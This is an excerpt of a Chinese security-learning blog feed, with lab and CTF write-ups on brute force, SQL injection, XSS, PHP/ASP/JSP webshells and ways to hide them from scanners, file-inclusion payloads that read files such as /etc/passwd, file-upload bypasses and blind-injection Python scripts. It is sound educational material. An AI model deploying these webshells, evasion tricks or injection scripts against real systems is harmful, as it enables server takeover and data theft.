<img src="https://z0ekball.github.io/post-images/image-20220415005904983.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415005959183.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010005414.png" alt="" loading="lazy"><br>
取最长返回页面为正确账号密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010014265.png" alt="" loading="lazy"></p>
<h2 id="brute-force-high">Brute Force-High</h2>
<p>抓包发现增加了一个<code>user-token</code>，增加了爆破难度<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010018654.png" alt="" loading="lazy"><br>
选中爆破目标，选择爆破方式<code>Pitchfork</code><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010022386.png" alt="" loading="lazy"><br>
设置字典<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010026049.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010034265.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010128796.png" alt="" loading="lazy"><br>
设置<code>单线程</code><br>
<img src="https://z0ekball.github.io/post-images/image-20220415010244279.png" alt="" loading="lazy"><br>
开始爆破，得到密码<br>
<img src="https://z0ekball.github.io/post-images/image-20220415010251470.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SQL注入、XSS漏洞简单复现与修复]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-fu-xian-sqlxss-lou-dong/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-fu-xian-sqlxss-lou-dong/">
        </link>
        <updated>2021-09-15T07:18:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="sql注入">SQL注入</h2>
<h3 id="复现">复现</h3>
<h4 id="环境">环境：</h4>
<pre><code>Apache  2.4.39
MySQL  5.0.96
PHP  5.5.9
</code></pre>
<h4 id="代码">代码：</h4>
<p>Connect.php用于连接已有的数据库<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001328673.png" alt="" loading="lazy"></p>
<p>简陋的sql漏洞网站就搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001341568.png" alt="" loading="lazy"></p>
<p>抓包进行post传参，检测是否存在漏洞</p>
<h4 id="验证">验证</h4>
<p>username= 1' or 1&gt;0#&amp;password=1，成功登入，说明存在注入漏洞<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001353343.png" alt="" loading="lazy"></p>
<p>username=Dumb'order by 3#&amp;password=Dumb，三个注入点<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001400244.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,3#&amp;password=1，回显点为2,3<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001406880.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,database()#&amp;password=1，查库<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001411085.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()limit 0,1#&amp;password=1，查表<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001414528.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'limit 0,1#&amp;password=1，查列<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001417936.png" alt="" loading="lazy"></p>
<p>username=1' union select 1,2,group_concat(concat_ws('-',username,password)) from security.users#&amp;password=1，查字段<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001421336.png" alt="" loading="lazy"></p>
<h3 id="修复">修复</h3>
<p>采用<code>预编译</code>的方式修复sql漏洞</p>
<h4 id="代码-2">代码：</h4>
<p><img src="https://z0ekball.github.io/post-images/image-20220415002911790.png" alt="" loading="lazy"><br>
简陋的slq漏洞修复网站搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002939430.png" alt="" loading="lazy">)</p>
<h4 id="验证-2">验证</h4>
<p>输入正确的账号和密码username=Dumb&amp;password=Dumb回显正常<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002945310.png" alt="" loading="lazy"></p>
<p>输入万能密码username=1' or 1&gt;0#&amp;password=Dumb，失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002949507.png" alt="" loading="lazy"></p>
<p>联合注入username=1'union select 1,2,3#&amp;password=Dumb，失败<br>
<img src="https://z0ekball.github.io/post-images/image-20220415002953596.png" alt="" loading="lazy"></p>
<p>Sql注入防御成功</p>
<h2 id="xss漏洞">XSS漏洞</h2>
<h3 id="复现-2">复现</h3>
<h4 id="环境-2">环境：</h4>
<pre><code>Apache  2.4.39
MySQL  5.0.96
PHP  5.5.9
</code></pre>
<h4 id="代码-3">代码：</h4>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415001606551.png" alt="" loading="lazy"></figure>
<p>简陋的xss漏洞网站搭成了<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001702624.png" alt="" loading="lazy"></p>
<h4 id="验证-3">验证</h4>
<p>输入xss<br>
<img src="https://z0ekball.github.io/post-images/image-20220415001753617.png" alt="" loading="lazy"></p>
<pre><code>输入&lt;script&gt;alert('xss')&lt;/script&gt;，存在xss漏洞
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415001801617.png" alt="" loading="lazy"></figure>
<h3 id="修复-2">修复</h3>
<p>基于原漏洞文件，作如下修改即可<br>
<img src="https://z0ekball.github.io/post-images/image-20220415003101438.png" alt="" loading="lazy"></p>
<pre><code>输入&lt;script&gt;alert('xss')&lt;/script&gt;，xss攻击失败
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415003106157.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[简单木马]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
        </link>
        <updated>2021-08-10T11:12:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一句话木马">一句话木马</h2>
<h3 id="原理">原理</h3>
<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
</code></pre>
<p><code>&lt;?php ?&gt;</code>：解析成php代码</p>
<p><code>@</code>：不报错</p>
<p><code>$_POST['pass']</code>：php里面几个超全局变量，<code>$_GET</code>、<code>$_POST</code>就是其中之一，意思为用post方法接收pass这个变量</p>
<p><code>eval()</code>：eval()把字符串作为PHP代码执行</p>
<p><code>整句意思</code>：post方式接收变量pass，若pass=echo 'a'，则代码就成了<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>，也就是通过pass这个变量传入php代码为所欲为。</p>
<p>通过一句话木马，使用菜刀、蚁剑、冰蝎等强悍的工具，可以攻陷整个网站主机。</p>
<h3 id="常见一句话木马">常见一句话木马</h3>
<h4 id="基础款">基础款</h4>
<pre><code class="language-php">php的一句话木马：&lt;?php @eval($_POST['pass']);?&gt;
asp的一句话木马：&lt;%eval request (&quot;pass&quot;)%&gt;
aspx的一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
jsp的一句话木马：
&lt;%
if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
%&gt;
</code></pre>
<h4 id="简单变型">简单变型</h4>
<p>php:</p>
<pre><code class="language-php">//绕过&lt;?
&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
    
//assert函数
&lt;?php assert(@$_POST[pass]);?&gt;
    
//creat_function函数，传参到fun()并执行
&lt;?php
$fun = create_function('',$_POST['pass']);
$fun();
?&gt;
    
//call_user_func回调函数，绕过waf
&lt;?php
@call_user_func(assert,$_POST['pass']);
?&gt;

//preg_replace函数
&lt;?php
@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
?&gt;

// file_put_contents函数,生成木马文件
&lt;?php
$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
file_put_contents(&quot;Trojan.php&quot;, $test);
?&gt;

//array数组
&lt;?php
$a='assert';
array_map(&quot;$a&quot;,$_REQUEST);
?&gt;
&lt;?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST[&quot;pass&quot;]);
?&gt;

//php变量函数
&lt;?php
$a = &quot;eval&quot;;
$a(@$_POST['pass']);
?&gt;

</code></pre>
<h3 id="木马免杀">木马免杀</h3>
<h4 id="木马查杀">木马查杀</h4>
<p><code>文件内容查杀</code>：对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测,即先建立一个恶意字符串特征库，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。容易误报，无法对加密或者经过特殊处理的Webshell文件进行检测。</p>
<p><code>网络请求查杀</code>：当木马被执行时，如果请求参数的值中存在某些危险函数、或者关键字，那么会被防护产品拦截，通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度。</p>
<p><code>日志分析查杀</code>：使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="木马免杀-2">木马免杀</h4>
<p><code>关键字绕过</code>：拆分关键字</p>
<p><code>构造函数</code>：构造一个函数，拼接成一句话木马</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return $_POST['pass'];
}
eval(x());
?&gt;
</code></pre>
<p><code>注释隔断</code>：一般查杀会对高危函数的前后语句进行拼接并检测，注释符可以隔断这种拼接从而绕过检查</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
}
eval(x());
?&gt;
</code></pre>
<p><code>转码绕过</code>：转码特征值，再通过解码来执行相关语句</p>
<p><code>数组拼接</code>：利用数组拼接木马语句</p>
<pre><code class="language-php">&lt;?php
$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
?&gt;
</code></pre>
<p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件包含]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
        </link>
        <updated>2021-07-29T02:59:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
</code></pre>
<p><code>敏感路径</code>：</p>
<p>典型：</p>
<pre><code class="language-php">?page=a.php
?home=b.html
?file=content…
</code></pre>
<p>Windows：</p>
<pre><code class="language-php">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
C:\windows\repair\sam //存储 windows 系统初次安装的密码
C:\Program Files\mysql\my.ini //mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\windows\php.ini //php 配置信息
C:\windows\my.ini //mysql 配置文件
</code></pre>
<p>UNIX/Linux：</p>
<pre><code class="language-php">/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP 相关配置
/etc/httpd/conf/httpd.conf //apache
/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
</code></pre>
<h4 id="本地包含">本地包含</h4>
<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
<p>1.txt:</p>
<pre><code class="language-php">&lt;?php phpinfo();?&gt;
</code></pre>
<p>1.php:</p>
<pre><code class="language-php">&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
</code></pre>
<h4 id="远程包含">远程包含</h4>
<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
Allow_url_include = on、allow_url_fopen=on</p>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
</code></pre>
<h4 id="php伪协议">php伪协议</h4>
<p><code>file://</code>:</p>
<p>用于访问本地文件系统</p>
<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
<pre><code class="language-php">file：//[文件的绝对路径和文件名]
    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
file：//[文件的相对路径和文件名]
    file=./phpinfo.txt
file：//[http：//网络路径和文件名]
    file=http://127.0.0.1/phpinfo.txt 
</code></pre>
<p><code>php：//filter</code>：</p>
<p>用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
（针对php文件需要base64编码）
</code></pre>
<p><code>php：//input</code>：</p>
<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
<pre><code class="language-php">php://input + [POST DATA]执行php代码
</code></pre>
<p>有写入权限则可以写入一句话木马</p>
<pre><code class="language-php">php://input
[POST DATA部分]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
</code></pre>
<p><code>php://stdin</code>:</p>
<p>只读，php://stdout 和 php://stderr 是只写的。</p>
<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
<p><code>zip://,bzip://,zlib://</code>:</p>
<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
bzip2://file.bz2
zlib://file.gz
</code></pre>
<p><code>data://</code>：</p>
<p>传递相应格式数据，用于执行php代码</p>
<p>条件：    allow_url_fope   on    allow_url_include on</p>
<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<p><code>phar：//</code></p>
<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件上传]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
        </link>
        <updated>2021-07-27T08:23:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
<h3 id="1无验证">1.无验证</h3>
<p>也就是前端和后端都不过滤上传的文件，故只需传入含一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>的php文件，再用菜刀或者蚁剑连接即可。</p>
<h3 id="2js前端验证">2.js前端验证</h3>
<p>顾名思义，就是只在浏览器前端进行简单的文件名过滤，只允许上传某种文件名。简单粗暴的做法是直接禁用浏览器里的js代码。<br>
<code>绕过方法</code>：把含有一句话木马的php文件改成允许上传的文件名，上传并抓包，修改文件后缀为php再放包即可。</p>
<h3 id="3mime绕过">3.MIME绕过</h3>
<p>上传php木马，抓包修改Content-Type为合法类型即可</p>
<p>例如：image/gif</p>
<h3 id="4htaccess">4.htaccess</h3>
<p><code>htaccess文件</code>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在文件上传中构造htaccess文件能使png以php格式解析。</p>
<p><code>和httpdp.com区别</code>：只作用于当前目录，只在访问当前目录才加载</p>
<p><code>漏洞利用</code></p>
<pre><code class="language-php">//方法一
SetHandler application/x-httpd-php  	//所有的文件当做php文件来解析
//方法二
AddType application/x-httpd-php .png	//.png文件当作php文件解析
</code></pre>
<p>在htaccess文件中写入代码并上传，再上传写有一句话木马的png文件，蚁剑连接即可。</p>
<h3 id="5文件头检查">5.文件头检查</h3>
<p>前面都是把含有一句话木马的php文件改变后缀变成png或者gif等可上传文件，而文件头检查则检查该文件的特征值，判断时候是真的png或者gif，故需要进一步伪装文件头。</p>
<p><code>绕过方法</code>:制作图马，简单图马是直接把一句话木马放在图片末尾以绕过文件头检查</p>
<pre><code class="language-php">//命令行合成图马
copy 1.png/b+1.txt/a 2.png
//b,a表示合成时各文件的编码方式，b为二进制，a为ascll
</code></pre>
<p><code>二次渲染</code>：同样也是检测文件是否是真的png或gif，上传之后的图片会被二次渲染，使得图马中的一句话木马变成乱码无法执行</p>
<p><code>绕过方法</code>：下载被二次渲染后的图马与原来的图马比较，找到相同的地方，插入一句话木马。</p>
<p>（png、jpg、jpeg都不好改，gif好改）<br>
<img src="https://z0ekball.github.io/post-images/image-20211018165017388.png" alt="" loading="lazy"></p>
<p>上传图马，配合解析漏洞、文件包含漏洞等使图马以php格式执行即可。</p>
<h3 id="6解析漏洞">6.解析漏洞</h3>
<h4 id="00截断攻击">00截断攻击</h4>
<p><code>漏洞原理</code>：系统端解析文件格式和服务端解析文件格式的顺序不同，系统端由后往前解析，服务端反之。抓包将 xxx.php.gif 换成 xxx.php_gif(下划线为0x00)。在上传文件时系统文件遇到0x00。会认为文件已经结束。从而将xxx.php.gif的内容写入到xxx.php。（需要允许修改保存路径）</p>
<p><code>绕过方法</code>：</p>
<p>GET方式上传：抓包，在保存路径后面添加1.php%00（%00会自动解码），文件名不变仍为1.gif</p>
<p>POST方式上传：抓包，在保存路径后面添加1.php+在HEX界面找到这个加号修改为00，文件名仍不变为1.gif</p>
<h4 id="黑名单绕过">黑名单绕过</h4>
<p><code>绕过方法</code>：</p>
<p>1、文件名大小写绕过（AsP, pHp等等）<br>
2、黑白名单列表绕过（php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、asa、jsp、jspx）cdx，<br>
3、特殊文件名绕过：修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格)由于这种命名格式在windows系统里是不允许的。所以在绕过上传之后windows系统会自动去掉 点和空格。Unix/Linux系统没有这个特性。<br>
4、0x00截断绕过<br>
5、.htaccess文件攻击（结合黑名单攻击）</p>
<h4 id="apache解析漏洞">Apache解析漏洞</h4>
<p><code>漏洞原理</code>：一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
<p><code>绕过方法</code>:添加无用扩展名如xxx.php --&gt;xxx.php.aaa</p>
<h4 id="iis解析漏洞">IIS解析漏洞</h4>
<p><code>IIS6.0解析漏洞</code>：</p>
<p>1.目录解析：以.asp 、.asa、.cer、.cdx命名的文件夹里的文件都将会被当成ASP文件执行。</p>
<p>2.文件解析：只要文件名中含有.asp;、.asa;、.cer;、.cdx;会优先按 asp来解析，.asp;.jpg 这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
<p><code>IIS7.0/7.5解析漏洞</code>:</p>
<p>对任意文件名只要在URL后面追加上字符串&quot;/任意文件名.php&quot;,就会按照 php 的方式去解析<br>
如”http://url/upload/1.jpg/1adf.php”</p>
<h2 id="练习题目">练习题目</h2>
<h3 id="极客大挑战-2019upload1">[极客大挑战 2019]Upload1</h3>
<p><code>MIME绕过</code>和<code>黑名单绕过</code>，只允许上传图片，对php有简单过滤。</p>
<p>上传一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>抓包修改<br>
<img src="https://z0ekball.github.io/post-images/image-20211019164716089.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20211019164731251.png" alt="" loading="lazy"></p>
<p>对内容有过滤，换一个木马</p>
<pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20211019165114142.png" alt="" loading="lazy"></figure>
<p>成功<br>
<img src="https://z0ekball.github.io/post-images/image-20211019165418509.png" alt="" loading="lazy"></p>
<p>访问该文件upload/2.phtml<br>
<img src="https://z0ekball.github.io/post-images/image-20211019165551551.png" alt="" loading="lazy"></p>
<p>说明存在该文件，蚁剑连接<br>
<img src="https://z0ekball.github.io/post-images/image-20211019170411685.png" alt="" loading="lazy"></p>
<p>找到flag</p>
<h3 id="actf2020-新生赛upload1">[ACTF2020 新生赛]Upload1</h3>
<p><code>前端过滤</code><br>
<img src="https://z0ekball.github.io/post-images/image-20211019170918935.png" alt="" loading="lazy"></p>
<p>把文件改成gif，抓包再改成php<br>
<img src="https://z0ekball.github.io/post-images/image-20211019171957129.png" alt="" loading="lazy"></p>
<p>修改<br>
<img src="https://z0ekball.github.io/post-images/image-20211019172023103.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/image-20211019172352138.png" alt="" loading="lazy"></p>
<p>emmmphp也要绕一下改成phtml<br>
<img src="https://z0ekball.github.io/post-images/image-20211019172444434.png" alt="" loading="lazy"></p>
<p>有了，访问该页面<br>
<img src="https://z0ekball.github.io/post-images/image-20211019172549473.png" alt="" loading="lazy"></p>
<p>蚁剑一下，用命令行找到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20211019173439257.png" alt="" loading="lazy"></p>
<h3 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h3>
<p><code>htaccess绕过</code></p>
<pre><code class="language-php">//把hack.png解析成php
&lt;FilesMatch &quot;hack.png&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>上传htaccess文件，抓包修改类型为png<br>
<img src="https://z0ekball.github.io/post-images/image-20211019180047323.png" alt="" loading="lazy"></p>
<p>再上传一个含有木马的假png，上传成功<br>
<img src="https://z0ekball.github.io/post-images/image-20211019175206673.png" alt="" loading="lazy"></p>
<p>蚁剑一下，找到flag</p>
<h3 id="第二章-web进阶文件上传1">[第二章 web进阶]文件上传1</h3>
<p>题目直接给出了源码，得到过滤信息：</p>
<p>1.仅允许上传zip、jpg、gif、png文件<br>
2.如果上传压缩包，压缩包内不允许含有php文件<br>
<img src="https://z0ekball.github.io/post-images/image-20211019183807280.png" alt="" loading="lazy"></p>
<p>上传一个含有php的zip<br>
<img src="https://z0ekball.github.io/post-images/image-20211019183103048.png" alt="" loading="lazy"><br>
要绕过php，改成phtml，上传成功，问题是不知道路径<br>
<img src="https://z0ekball.github.io/post-images/image-20211019183524005.png" alt="" loading="lazy"><br>
上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下<br>
010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）<br>
<img src="https://z0ekball.github.io/post-images/image-20211019191350117.png" alt="" loading="lazy"><br>
emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)<br>
上传后访问，得到flag<br>
<img src="https://z0ekball.github.io/post-images/image-20211019192014051.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
        <id>https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
        <link href="https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
        </link>
        <updated>2021-06-18T14:56:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmap知识补充">sqlmap知识补充</h1>
<pre><code>-r 表示加载一个文件
-p 指定参数
</code></pre>
<h1 id="less-11普普通通的post">less-11(普普通通的post)</h1>
<h3 id="上传post文件得到参数">上传post文件，得到参数</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
<h3 id="根据参数得到当前数据库">根据参数，得到当前数据库</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
<h3 id="获取用户名和密码">获取用户名和密码</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
<h3 id="脚本查询当前数据库名称采用盲注形式">脚本：查询当前数据库名称(采用盲注形式)</h3>
<pre><code class="language-python">import requests #比urllib.parse方便
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-11/&quot;
d = list('abcdefghijklmnopqrstuvwxyz0123456789@_.{}?!')
#注入字段
inn=&quot;1' or 1=1 and mid((database()),%s,1)='%s'#&quot;
for i in range(1,30):
    for j in d:
        #字典格式
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #发送post请求
        response = requests.post(url,data = data)
        #获取报文
        t=response.text
        if t.find('Login') &gt;0:
            name+=j
            print(j)
print(name)
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>uname=n&quot;) or 1=1 #,其他和11一样</p>
<h1 id="less-13时间盲注">less-13(时间盲注)</h1>
<h3 id="获取id和用户名">获取id和用户名</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
<h3 id="脚本获取id3的用户名参考时间盲注">脚本：获取id=3的用户名，参考时间盲注</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-13/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n') or if(mid((select username from security.users where id=3),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-2">结果</h3>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>和13一样的时间盲注，但注意转义成 \&quot;</p>
<h3 id="脚本获取库">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-14/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
#这里的引号有冲突，改为\&quot;
inn=&quot;n\&quot; or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-3">结果</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
<h1 id="less-15密码注入点">less-15(密码注入点)</h1>
<p>和前面一样，注入点改为密码</p>
<h3 id="脚本获取库-2">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-15/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n' or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        #注入点在密码
        data={'uname':'','passwd':inn %(i,j),'submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-4">结果</h3>
